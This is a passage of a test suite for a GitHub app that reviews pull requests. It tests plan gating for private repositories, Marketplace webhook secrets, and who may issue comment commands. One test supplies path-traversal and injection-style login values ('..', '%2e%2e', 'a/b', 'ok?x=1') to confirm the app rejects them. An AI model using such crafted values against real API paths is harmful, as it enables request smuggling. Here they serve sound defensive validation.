    expect(sql.rows("SELECT COUNT(*) AS n FROM github_prs")[0]!.n).toBe(1);
    advance(23 * 86_400_000);
    await githubRetention(env.DB!, now());
    expect(sql.rows("SELECT * FROM github_prs")).toEqual([]);
    expect(await prRow(env.DB!, REPO.id, 12)).toBeNull();
    // what was done once for the repository is not swept: it is not done again a month later
    expect(sql.rows("SELECT repo_id, evidence IS NOT NULL AS evidence, intro IS NOT NULL AS intro FROM github_repo_facts")).toEqual([{ repo_id: REPO.id, evidence: 1, intro: 1 }]);
  });
});

describe("github app: private repositories", () => {
  const PRIVATE = { ...REPO, id: 7002, name: "vault", full_name: "acme/vault", private: true };
  const openPr = (env: Parameters<typeof deliver>[0], gh: ReturnType<typeof fakeGithub>) => pullRequest(env, gh, "opened", 3, SHA1, { head: { sha: SHA1, ref: "f", repo: { id: PRIVATE.id } }, base: { ref: "main", repo: { id: PRIVATE.id } } }, PRIVATE);

  it("without a plan nothing of a private repository is read: one neutral check says why, once per repository, and its test runs start nothing", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
    gh.repos.set(PRIVATE.full_name, PRIVATE.id);
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    expect(await result(await openPr(env, gh))).toBe("private repository without a plan");
    expect(gh.calls.map((c) => `${c.method} ${c.path}`)).toEqual([`POST /app/installations/${INSTALLATION}/access_tokens`, "POST /repos/acme/vault/check-runs"]);
    const check = [...gh.checks.values()][0];
    expect(check.output.title).toBe("Private repositories need a plan");
    expect(check.output.summary).toContain("nothing was read and nothing is posted here");
    const run = gh.addRun(SHA1, undefined, {}, PRIVATE.full_name);
    const before = gh.calls.length;
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1, {}, PRIVATE), { fetch: gh.fetch }))).toBe("private repository without a plan");
    expect(await result(await deliver(env, "issue_comment", commentEvent(3, "@genclass-dev review", {}, PRIVATE), { fetch: gh.fetch }))).toBe("private repository without a plan");
    expect(gh.calls.length).toBe(before);
    // the same event again does not write the same check again
    await openPr(env, gh);
    expect(gh.calls.filter((c) => c.path.endsWith("/check-runs"))).toHaveLength(1);
    // once per repository, never again: not on the pull request's next push, not on another pull request, and never as a comment
    const again = gh.calls.length;
    const at = (n: number, sha: string) => pullRequest(env, gh, n === 3 ? "synchronize" : "opened", n, sha, { head: { sha, ref: "f", repo: { id: PRIVATE.id } }, base: { ref: "main", repo: { id: PRIVATE.id } } }, PRIVATE);
    expect(await result(await at(3, SHA2))).toBe("private repository without a plan");
    expect(await result(await at(4, SHA3))).toBe("private repository without a plan");
    expect(gh.calls.length).toBe(again);
    expect(gh.checks.size).toBe(1);
    expect(gh.comments.size).toBe(0);
    expect(sql.rows("SELECT repo_id, plan_notice IS NOT NULL AS told, evidence, intro FROM github_repo_facts")).toEqual([{ repo_id: PRIVATE.id, told: 1, evidence: null, intro: null }]);
    // none of it was counted against the installation's hour
    expect(sql.rows("SELECT * FROM github_usage")).toEqual([]);
  });

  it("reviewed when the server is open, when the managing account's plan includes them, or with a paid Marketplace plan", async () => {
    const open = githubSetup({ GITHUB_APP_PRIVATE_REPOS: "open" });
    const g1 = fakeGithub();
    g1.repos.set(PRIVATE.full_name, PRIVATE.id);
    expect(await result(await openPr(open.env, g1))).toBe("no race files");

    const plan = githubSetup();
    const g2 = fakeGithub();
    g2.repos.set(PRIVATE.full_name, PRIVATE.id);
    await deliver(plan.env, "installation", installationCreated(), { fetch: g2.fetch });
    const me = await signedIn(plan.env);
    plan.sql.db.prepare("UPDATE github_installations SET owner = ?").run(me.account.id);
    expect(await result(await openPr(plan.env, g2))).toBe("private repository without a plan");
    // GenClass's own grant gives Enterprise, whose entitlements include private repositories
    setPlan(plan.sql, me.account.id, "free", { comp_until: new Date(now().getTime() + 86_400_000).toISOString() });
    expect(await result(await pullRequest(plan.env, g2, "synchronize", 3, SHA2, { head: { sha: SHA2, ref: "f", repo: { id: PRIVATE.id } } }, PRIVATE))).toBe("no race files");

    const market = githubSetup();
    const g3 = fakeGithub();
    g3.repos.set(PRIVATE.full_name, PRIVATE.id);
    const purchase = (action: string, cents: number) => ({ action, effective_date: "2026-10-13T00:00:00Z", marketplace_purchase: { account: { id: OWNER.id, login: OWNER.login, type: "Organization" }, plan: { id: 31, name: cents ? "Team" : "Open source", monthly_price_in_cents: cents }, unit_count: 1, on_free_trial: false, free_trial_ends_on: null } });
    expect(await result(await deliver(market.env, "marketplace_purchase", purchase("purchased", 0), { fetch: g3.fetch, path: "/api/github/marketplace" }))).toBe("purchased");
    expect(await result(await openPr(market.env, g3))).toBe("private repository without a plan");
    expect(await result(await deliver(market.env, "marketplace_purchase", purchase("changed", 2900), { fetch: g3.fetch, path: "/api/github/marketplace" }))).toBe("changed");
    expect(market.sql.rows("SELECT account_id, plan_name, monthly_cents FROM github_marketplace")).toEqual([{ account_id: OWNER.id, plan_name: "Team", monthly_cents: 2900 }]);
    expect(await result(await pullRequest(market.env, g3, "synchronize", 3, SHA2, { head: { sha: SHA2, ref: "f", repo: { id: PRIVATE.id } } }, PRIVATE))).toBe("no race files");
    expect(await result(await deliver(market.env, "marketplace_purchase", { ...purchase("pending_change", 0) }, { fetch: g3.fetch, path: "/api/github/marketplace" }))).toBe("pending change");
    expect(JSON.parse(String(market.sql.rows("SELECT pending FROM github_marketplace")[0]!.pending))).toMatchObject({ plan_id: 31 });
    expect(await result(await deliver(market.env, "marketplace_purchase", purchase("cancelled", 2900), { fetch: g3.fetch, path: "/api/github/marketplace" }))).toBe("cancelled");
    expect(market.sql.rows("SELECT * FROM github_marketplace")).toEqual([]);
  });

  it("each webhook takes only its own events, and the listing's webhook may have a secret of its own", async () => {
    const { env, sql } = githubSetup({ GITHUB_MARKETPLACE_WEBHOOK_SECRET: "marketplace-secret-0123456789" });
    const gh = fakeGithub();
    const purchase = { action: "purchased", marketplace_purchase: { account: { id: 1, login: "a" }, plan: { id: 2, name: "Team", monthly_price_in_cents: 100 } } };
    // signed with the app's secret, the listing's endpoint refuses it; the app's endpoint ignores the event
    expect((await deliver(env, "marketplace_purchase", purchase, { fetch: gh.fetch, path: "/api/github/marketplace" })).status).toBe(401);
    expect(await result(await deliver(env, "marketplace_purchase", purchase, { fetch: gh.fetch }))).toBe("ignored");
    expect(await result(await deliver(env, "pull_request", pullEvent("opened", 1, SHA1), { fetch: gh.fetch, path: "/api/github/marketplace", secret: "marketplace-secret-0123456789" }))).toBe("ignored");
    expect(sql.rows("SELECT * FROM github_marketplace")).toEqual([]);
    expect(await result(await deliver(env, "marketplace_purchase", purchase, { fetch: gh.fetch, path: "/api/github/marketplace", secret: "marketplace-secret-0123456789" }))).toBe("purchased");
    expect(sql.rows("SELECT login FROM github_marketplace")).toEqual([{ login: "a" }]);
    expect(WEBHOOK_SECRET).not.toBe("marketplace-secret-0123456789");
  });
});

describe("github app: commands in pull-request comments", () => {
  it("help, replay and a finding that does not exist: one reply each, with a reaction to show the command was seen", async () => {
    const { env, gh } = await reviewed();
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev help", { id: 9001 }), { fetch: gh.fetch }))).toBe("help");
    expect(gh.reactions).toEqual([{ comment: 9001, content: "eyes" }]);
    expect(gh.posted(12)[1]).toContain("@genclass-dev replay <n>");
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev replay 1"), { fetch: gh.fetch }))).toBe("replay");
    expect(gh.posted(12)[2]).toContain('`npx playwright test checkout.spec.ts -g "places one order" --repeat-each 2`');
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev replay 9"), { fetch: gh.fetch }))).toBe("no such finding");
    expect(gh.posted(12)[3]).toContain("There is no finding 9 on this pull request. Its findings are numbered 1, 2");
    // none of the replies is the summary comment, which is still the first one
    expect(gh.posted(12)[0]).toContain("## GenClass runtime review");
    expect(gh.posted(12)).toHaveLength(4);
  });

  it("who may command: collaborators; the author for review, replay and help; never a stranger, a bot, or the app itself", async () => {
    const { env, gh } = await reviewed();
    const count = () => gh.posted(12).length;
    const stranger = { user: { id: 666, login: "mallory", type: "User" }, association: "NONE" };
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev help", stranger), { fetch: gh.fetch }))).toBe("not allowed");
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev fix 1", { ...stranger, association: "CONTRIBUTOR" }), { fetch: gh.fetch }))).toBe("not allowed");
    // the pull request's author, without write access (by GitHub's answer for ada): help yes, fix and pause no
    gh.permissions.set("ada", "read");
    const author = { user: { id: 77, login: "ada", type: "User" }, association: "CONTRIBUTOR" };
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev help", author), { fetch: gh.fetch }))).toBe("help");
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev pause", author), { fetch: gh.fetch }))).toBe("not allowed");
    // a member of the organization whose permission on this repository is read: GitHub is asked, and says no
    gh.permissions.set("bob", "read");
    const bob = { user: { id: 88, login: "bob", type: "User" }, association: "MEMBER" };
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev fix 1", bob), { fetch: gh.fetch }))).toBe("not allowed");
    expect(gh.calls.some((c) => c.path === "/repos/acme/shop/collaborators/bob/permission")).toBe(true);
    for (const bot of [{ id: 1, login: "genclass-dev[bot]", type: "Bot" }, { id: 2, login: "dependabot[bot]", type: "Bot" }, { id: 3, login: "sneaky[bot]", type: "User" }]) {
      expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev help", { user: bot, association: "COLLABORATOR" }), { fetch: gh.fetch })), bot.login).toBe("bot");
    }
    expect(count()).toBe(2);
    // not a command, an edit, an issue that is not a pull request, a closed pull request
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "nice, could @genclass-dev review this?"), { fetch: gh.fetch }))).toBe("no command");
    expect(await result(await deliver(env, "issue_comment", { ...commentEvent(12, "@genclass-dev help"), action: "edited" }, { fetch: gh.fetch }))).toBe("ignored");
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev help", { issue: { pull_request: undefined } }), { fetch: gh.fetch }))).toBe("not a pull request");
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev help", { issue: { state: "closed" } }), { fetch: gh.fetch }))).toBe("closed");
    expect(count()).toBe(2);
  });

  it("fix: a brief for a branch of this repository, asked for by someone with write access; never for a fork", async () => {
    const { env, gh } = await reviewed();
    gh.pulls.set(`${REPO.full_name}#12`, pullEvent("opened", 12, SHA1).pull_request);
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev fix 1"), { fetch: gh.fetch }))).toBe("fix brief");
    const brief = gh.posted(12)[1]!;
    expect(brief.startsWith("<!-- genclass-bot:fix-brief -->\n### Fix brief, finding 1\n")).toBe(true);
    expect(brief).toContain("Asked for by ada.");
    const json = JSON.parse(/```json\n([\s\S]*?)\n```/.exec(brief)![1]!);
    expect(json).toMatchObject({ schema: "genclass-brief/1", repository: "acme/shop", pull_request: 12, head_sha: SHA1, finding: { number: 1, operation: "POST /api/orders", reproducible: true } });
    // the same pull request, but its head is a fork's branch
    gh.pulls.set(`${REPO.full_name}#12`, pullEvent("opened", 12, SHA1, { head: { sha: SHA1, ref: "patch", repo: { id: 99001, full_name: "mallory/shop" } } }).pull_request);
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev fix 1"), { fetch: gh.fetch }))).toBe("fix refused for a fork");
    expect(gh.posted(12)[2]).toContain("A fix brief is only written for branches of this repository.");
    expect(gh.posted(12)[2]).not.toContain("genclass-bot:fix-brief");
  });

  it("pause and resume a pull request; review on request; issue on request; commands off", async () => {
    const { env, gh, sql } = await reviewed();
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev pause"), { fetch: gh.fetch }))).toBe("paused");
    expect(sql.rows("SELECT paused FROM github_prs")[0]!.paused).toBe(1);
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA2))).toBe("paused on this pull request");
    // asked for by a person, a review runs even while paused
    expect(gh.checksAt(SHA2)).toEqual([]);
    gh.addRun(SHA2);
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev review"), { fetch: gh.fetch }))).toBe("findings");
    expect(gh.checksAt(SHA2)).toHaveLength(1);
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev resume"), { fetch: gh.fetch }))).toBe("resumed");
    expect(sql.rows("SELECT paused FROM github_prs")[0]!.paused).toBe(0);
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA3))).toBe("no race files");

    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev issue 2"), { fetch: gh.fetch }))).toBe("issue");
    expect(gh.issues).toHaveLength(1);
    expect(gh.issues[0]!.title).toBe("Stale response on GET /api/search (GenClass, from #12)");
    expect(gh.posted(12).at(-1)).toContain("Opened #301 for finding 2.");

    const off = await reviewed({}, "commands: false\n");
    expect(await result(await deliver(off.env, "issue_comment", commentEvent(12, "@genclass-dev help"), { fetch: off.gh.fetch }))).toBe("commands are off");
    expect(off.gh.posted(12)).toHaveLength(1);
    expect(off.gh.summary(12)).not.toContain("@genclass-dev replay 1");
  });
});

describe("github app: production findings of a linked app", () => {
  it("the linked app's findings on the pages the pull request's files serve are listed; the rest are counted", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
    const me = await signedIn(env);
    const app = await createApp(env, me.cookie, "Shop");
    await sendBatch(env, app.token, [...detection("stale", "/checkout"), ...detection("duplicate", "/checkout"), ...detection("stale", "/admin/users")]);
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    sql.db.prepare("INSERT INTO github_repos (repo_id, installation_id, full_name, private, project_id, linked_by, linked, updated) VALUES (?, ?, ?, 0, ?, ?, ?, ?)").run(REPO.id, INSTALLATION, REPO.full_name, app.id, me.account.id, now().toISOString(), now().toISOString());
    gh.files.set(`${REPO.full_name}#12`, [
      { filename: "app/checkout/page.tsx", status: "modified", patch: "@@ -1 +1 @@\n-a\n+b" },
      { filename: "src/lib/cart.ts", status: "modified" },
      { filename: "app/old/page.tsx", status: "removed" },
    ]);
    expect(await result(await pullRequest(env, gh, "opened", 12, SHA1))).toBe("no race files");
    const body = gh.summary(12)!;
    expect(body).toContain("### In production: Shop, last 7 days");
    expect(body).toContain("| Detection, stale | `/checkout` | 1 | `app/checkout/page.tsx` |");
    expect(body).toContain("| Detection, duplicate | `/checkout` | 1 | `app/checkout/page.tsx` |");
    expect(body).toContain("1 more finding on 1 other page.");
    expect(body).not.toContain("/admin/users");
    expect(body).not.toContain("SECRET PAGE TEXT");
    expect(body).toContain(`[Open the dashboard](${ORIGIN}/account/apps/${app.id})`);
    // a pull request that touches no page route says so and lists nothing
    gh.files.set(`${REPO.full_name}#13`, [{ filename: "src/lib/cart.ts", status: "modified" }]);
    await pullRequest(env, gh, "opened", 13, SHA2);
    expect(gh.summary(13)).toBeNull();
    // production: false in the settings turns it off, and the files are not listed any more
    gh.settings.set(REPO.full_name, "production: false\n");
    advance(121_000);
    const before = gh.calls.length;
    await pullRequest(env, gh, "opened", 16, SHA3);
    expect(gh.calls.slice(before).some((c) => c.path.endsWith("/files"))).toBe(false);
    expect(gh.summary(16)).toBeNull();
  });

  it("deleting the app or the account takes the link away", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
    const me = await signedIn(env);
    const app = await createApp(env, me.cookie, "Shop");
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    const link = () => sql.db.prepare("INSERT OR REPLACE INTO github_repos (repo_id, installation_id, full_name, private, project_id, linked_by, linked, updated) VALUES (?, ?, ?, 0, ?, ?, ?, ?)").run(REPO.id, INSTALLATION, REPO.full_name, app.id, me.account.id, now().toISOString(), now().toISOString());
    link();
    sql.db.prepare("UPDATE github_installations SET owner = ?").run(me.account.id);
    expect((await call(env, "DELETE", `/api/account/projects/${app.id}`, { cookie: me.cookie, body: { confirm: "delete" } })).status).toBe(204);
    expect(sql.rows("SELECT project_id, linked_by FROM github_repos")).toEqual([{ project_id: null, linked_by: null }]);
    const again = await createApp(env, me.cookie, "Shop 2");
    sql.db.prepare("UPDATE github_repos SET project_id = ?, linked_by = ?").run(again.id, me.account.id);
    expect((await call(env, "DELETE", "/api/account", { cookie: me.cookie, body: { confirm: "delete" } })).status).toBe(204);
    expect(sql.rows("SELECT project_id, linked_by FROM github_repos")).toEqual([{ project_id: null, linked_by: null }]);
    expect(sql.rows("SELECT owner FROM github_installations")).toEqual([{ owner: null }]);
  });
});

describe("github app: a settings file that could not be fetched is not a missing file (src/github/handlers.ts header)", () => {
  const FILE = "/contents/.github/genclass.yml";
  const asked = (gh: ReturnType<typeof fakeGithub>) => gh.calls.filter((c) => c.path.endsWith(FILE)).length;
  const writes = (gh: ReturnType<typeof fakeGithub>) => gh.calls.filter((c) => c.method !== "GET" && !c.path.includes("/access_tokens")).map((c) => `${c.method} ${c.path}`);

  it("GitHub answers 5xx for the file: the review writes nothing and keeps nothing, and the next event applies the repository's own settings", async () => {
    const { env, sql } = githubSetup();
    let down = true;
    const gh = fakeGithub({ answer: (c) => (down && c.path.endsWith(FILE) ? new Response("{}", { status: 502 }) : undefined) });
    gh.settings.set(REPO.full_name, "comment: never\ninline: false\ncheck:\n  fail_on: reproducible\n");
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    const run = gh.addRun(SHA1);
    // on the defaults this review would post the summary comment and finish the check neutral, which passes a required check
    const first = await pullRequest(env, gh, "opened", 12, SHA1);
    expect(first.status).toBe(502);
    expect(await result(first)).toBe("failed: server");
    // (a read is tried twice)
    expect(asked(gh)).toBe(2);
    expect(writes(gh)).toEqual([]);
    // the review is owed, and its lease was let go
    expect(sql.rows("SELECT due IS NOT NULL AS due, lease FROM github_prs")).toEqual([{ due: 1, lease: null }]);
    // the failure was not kept as "no file": the test run's event, a moment later, asks GitHub again
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch }))).toBe("failed: server");
    expect(asked(gh)).toBe(4);
    expect(writes(gh)).toEqual([]);
    // GitHub answers again: no comment, no inline comment, and the check fails as the repository asked
    down = false;
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch }))).toBe("findings");
    expect(gh.posted(12)).toEqual([]);
    expect(gh.reviews).toEqual([]);
    expect(gh.checksAt(SHA1)).toHaveLength(1);
    expect(gh.checksAt(SHA1)[0]).toMatchObject({ status: "completed", conclusion: "failure" });
  });

  it("GitHub does not answer, or gives no installation token for the read: commands that are turned off stay off", async () => {
    const { env } = githubSetup();
    let mode: "up" | "network" | "token" = "up";
    const gh = fakeGithub({
      answer: (c) => {
        if (mode === "network" && c.path.endsWith(FILE)) throw new Error("connect timeout");
        if (mode === "token" && c.path.includes("/access_tokens")) {
          // one failed request for a token: the next one is answered
          mode = "up";
          return new Response("{}", { status: 502 });
        }
        return undefined;
      },
    });
    gh.settings.set(REPO.full_name, "commands: false\nreviews: false\n");
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    expect(await result(await pullRequest(env, gh, "opened", 12, SHA1))).toBe("automatic reviews are off");
    // the copy read for that review is past its two minutes
    advance(121_000);
    mode = "network";
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev help"), { fetch: gh.fetch }))).toBe("failed: network");
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev review"), { fetch: gh.fetch }))).toBe("failed: network");
    expect(writes(gh)).toEqual([]);
    // the installation token has run out, and the request for a new one fails once: the settings read is what needed it
    advance(3_600_000);
    mode = "token";
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev help"), { fetch: gh.fetch }))).toBe("failed: server");
    expect(writes(gh)).toEqual([]);
    // nothing of that was kept: asked again, GitHub answers, and the file says commands are off
    expect(mode).toBe("up");
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev help"), { fetch: gh.fetch }))).toBe("commands are off");
    expect(gh.posted(12)).toEqual([]);
    expect(gh.reactions).toEqual([]);
  });

  it("a test run that ends while the settings cannot be read leaves its pull request owed a review, and the daily sweep runs it under the real settings", async () => {
    const { env, sql } = githubSetup();
    let down = false;
    const gh = fakeGithub({ answer: (c) => (down && c.path.endsWith(FILE) ? new Response("{}", { status: 503 }) : undefined) });
    gh.settings.set(REPO.full_name, "artifact: e2e-races\ncomment: never\n");
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    expect(await result(await pullRequest(env, gh, "opened", 12, SHA1))).toBe("no race files");
    expect(sql.rows("SELECT due FROM github_prs")[0]!.due).toBeNull();
    advance(121_000);
    down = true;
    // on the defaults, the artifact's name would not be the one read ("genclass"), and the run would be passed over
    const run = gh.addRun(SHA1, { "e2e-races": racesZip() });
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch }))).toBe("failed: server");
    expect(sql.rows("SELECT due FROM github_prs")[0]!.due).not.toBeNull();
    expect(gh.posted(12)).toEqual([]);
    down = false;
    advance(3_700_000);
    expect(await githubSweep(env, { now, fetch: gh.fetch })).toBe(1);
    expect(gh.checksAt(SHA1).at(-1).output.title).toBe("2 findings, 1 reproducible");
    expect(gh.posted(12)).toEqual([]);
    expect(sql.rows("SELECT due FROM github_prs")[0]!.due).toBeNull();
  });

  it("GitHub's own answer that there is nothing to read is the defaults, kept two minutes: no single-file permission, a file too large", async () => {
    // 403: the app was registered without the single-file permission (docs/github-app/SETUP.md). Reviews still work.
    const { env } = githubSetup();
    const gh = fakeGithub({ answer: (c) => (c.path.endsWith(FILE) ? new Response(JSON.stringify({ message: "Resource not accessible by integration" }), { status: 403 }) : undefined) });
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    await pullRequest(env, gh, "opened", 12, SHA1);
    const run = gh.addRun(SHA1);
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch }))).toBe("findings");
    expect(gh.summary(12)).toContain("**2 findings**");
    expect(asked(gh)).toBe(1);
    // too large: the defaults, and the check says so, from the kept answer as well
    const big = await reviewed({}, `comment: never\n# ${"x".repeat(70_000)}\n`);
    expect(asked(big.gh)).toBe(1);
    expect(big.gh.checksAt(SHA1)[0].output.summary).toContain(".github/genclass.yml is too large to read; the defaults are used.");
    expect(big.gh.summary(12)).toContain("**2 findings**");
  });
});

describe("github app: who may command is GitHub's answer about the commenter (docs/github-app/README.md, \"Commands\")", () => {
  const PERMISSION = (login: string) => `/repos/acme/shop/collaborators/${login}/permission`;

  it("a member whose membership is private has write access and may command, whatever association the event carries", async () => {
    const { env, gh, sql } = await reviewed();
    // grace has write access through a team. Her membership of the organization is private (GitHub's default), so
    // the comment event calls her a contributor, or nothing at all.
    gh.permissions.set("grace", "write");
    for (const association of ["CONTRIBUTOR", "NONE", "FIRST_TIME_CONTRIBUTOR"]) {
      const grace = { user: { id: 90, login: "grace", type: "User" }, association };
      expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev fix 1", grace), { fetch: gh.fetch })), association).toBe("fix brief");
      expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev replay 1", grace), { fetch: gh.fetch })), association).toBe("replay");
    }
    const grace = { user: { id: 90, login: "grace", type: "User" }, association: "NONE" };
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev pause", grace), { fetch: gh.fetch }))).toBe("paused");
    expect(sql.rows("SELECT paused FROM github_prs")[0]!.paused).toBe(1);
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev resume", grace), { fetch: gh.fetch }))).toBe("resumed");
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev issue 1", grace), { fetch: gh.fetch }))).toBe("issue");
    expect(gh.issues).toHaveLength(1);
    gh.permissions.set("root", "admin");
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev help", { user: { id: 92, login: "root", type: "User" }, association: "NONE" }), { fetch: gh.fetch }))).toBe("help");
  });

  it("a member or collaborator who can only read may not command on someone else's pull request: review, replay and help included", async () => {
    const { env, gh } = await reviewed();
    gh.permissions.set("bob", "read");
    const said = gh.posted(12).length;
    const commands = ["review", "replay 1", "help", "fix 1", "issue 1", "pause", "resume"];
    for (const association of ["MEMBER", "COLLABORATOR", "OWNER"]) {
      const bob = { user: { id: 88, login: "bob", type: "User" }, association };
      for (const c of commands) expect(await result(await deliver(env, "issue_comment", commentEvent(12, `@genclass-dev ${c}`, bob), { fetch: gh.fetch })), `${association} ${c}`).toBe("not allowed");
    }
    // GitHub was asked each time, and to someone who may not command the app says nothing at all
    expect(gh.calls.filter((c) => c.path === PERMISSION("bob"))).toHaveLength(3 * commands.length);
    expect(gh.posted(12)).toHaveLength(said);
    expect(gh.reactions).toEqual([]);
    expect(gh.issues).toEqual([]);
  });

  it("someone GitHub does not know on the repository may not command; when GitHub cannot be asked, the command is not run on the association's word", async () => {
    const { env } = githubSetup();
    const gh = fakeGithub({
      answer: (c) => (c.path === PERMISSION("ghost") ? new Response(JSON.stringify({ message: "Not Found" }), { status: 404 }) : c.path === PERMISSION("slow") ? new Response("{}", { status: 502 }) : undefined),
    });
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    await pullRequest(env, gh, "opened", 12, SHA1);
    const writes = () => gh.calls.filter((c) => c.method !== "GET" && !c.path.includes("/access_tokens")).length;
    const before = writes();
    for (const c of ["help", "review", "fix 1"]) {
      expect(await result(await deliver(env, "issue_comment", commentEvent(12, `@genclass-dev ${c}`, { user: { id: 99, login: "ghost", type: "User" }, association: "COLLABORATOR" }), { fetch: gh.fetch })), c).toBe("not allowed");
      expect(await result(await deliver(env, "issue_comment", commentEvent(12, `@genclass-dev ${c}`, { user: { id: 98, login: "slow", type: "User" }, association: "OWNER" }), { fetch: gh.fetch })), c).toBe("failed: server");
    }
    expect(writes()).toBe(before);
  });

  it("a login with an underscore (an Enterprise Managed User) is a login; one that is not safe in an API path is never put in one", async () => {
    const { env, gh } = await reviewed();
    gh.permissions.set("mona-cat_octo", "write");
    const mona = { user: { id: 91, login: "mona-cat_octo", type: "User" }, association: "MEMBER" };
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev review", mona), { fetch: gh.fetch }))).toBe("findings");
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev fix 1", mona), { fetch: gh.fetch }))).toBe("fix brief");
    expect(gh.calls.filter((c) => c.path === PERMISSION("mona-cat_octo"))).toHaveLength(2);
    // printed through the escaping: the underscore cannot start emphasis
    expect(gh.posted(12).at(-1)).toMatch(/Asked for by mona-cat\\?_octo\./);
    const before = gh.calls.length;
    for (const login of ["a/b", "..", "x y", "", "%2e%2e", "ok?x=1", "a".repeat(40), "<b>", "ada\n"]) {
      expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev help", { user: { id: 93, login, type: "User" }, association: "OWNER" }), { fetch: gh.fetch })), JSON.stringify(login)).toBe("ignored");
    }
    expect(gh.calls.length).toBe(before);
    expect(githubLogin("mona-cat_octo")).toBe("mona-cat_octo");
    expect(githubLogin("a".repeat(39))).toBe("a".repeat(39));
    expect(githubLogin("dependabot[bot]")).toBe("dependabot[bot]");
    for (const bad of ["a[bot]b", "[bot]", "a.b", "a b", "a/b", 7, null, undefined]) expect(githubLogin(bad), String(bad)).toBeNull();
  });

  it("a review asked for by the pull request's author without write access reads the commit again, and lifts neither a pause nor ignore_authors", async () => {
    const { env, gh } = await reviewed();
    gh.permissions.set("grace", "write");
    const grace = { user: { id: 90, login: "grace", type: "User" }, association: "MEMBER" };
    // ada opened the pull request (from a fork, say) and has no write access
    gh.permissions.set("ada", "read");
    const ada = { user: { id: 77, login: "ada", type: "User" }, association: "CONTRIBUTOR" };
    // not paused: her review reads the commit's race files again
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev review", ada), { fetch: gh.fetch }))).toBe("findings");
    // a maintainer pauses the pull request; the next commit is not read
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev pause", grace), { fetch: gh.fetch }))).toBe("paused");
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA2))).toBe("paused on this pull request");
    gh.addRun(SHA2);
    const summary = gh.summary(12);
    const mark = gh.calls.length;
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev review", ada), { fetch: gh.fetch }))).toBe("paused on this pull request");
    // nothing was read for the commit and nothing was written but the reaction that says the command was seen
    expect(gh.calls.slice(mark).filter((c) => c.method !== "GET").map((c) => c.path)).toEqual([expect.stringMatching(/\/reactions$/)]);
    expect(gh.calls.slice(mark).some((c) => c.path.includes("/actions/"))).toBe(false);
    expect(gh.checksAt(SHA2)).toEqual([]);
    expect(gh.summary(12)).toBe(summary);
    // someone with write access can still have it read while paused
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev review", grace), { fetch: gh.fetch }))).toBe("findings");
    expect(gh.checksAt(SHA2)).toHaveLength(1);

    // reviews.ignore_authors: the same
    const s = githubSetup();
    const g = fakeGithub();
    g.settings.set(REPO.full_name, "reviews:\n  ignore_authors: [ada]\n");
    g.permissions.set("grace", "write");
    g.permissions.set("ada", "read");
    await deliver(s.env, "installation", installationCreated(), { fetch: g.fetch });
    expect(await result(await pullRequest(s.env, g, "opened", 12, SHA1))).toBe("author not reviewed");
    g.addRun(SHA1);
    expect(await result(await deliver(s.env, "issue_comment", commentEvent(12, "@genclass-dev review", ada), { fetch: g.fetch }))).toBe("author not reviewed");
    expect(g.checksAt(SHA1)).toEqual([]);
    expect(g.posted(12)).toEqual([]);
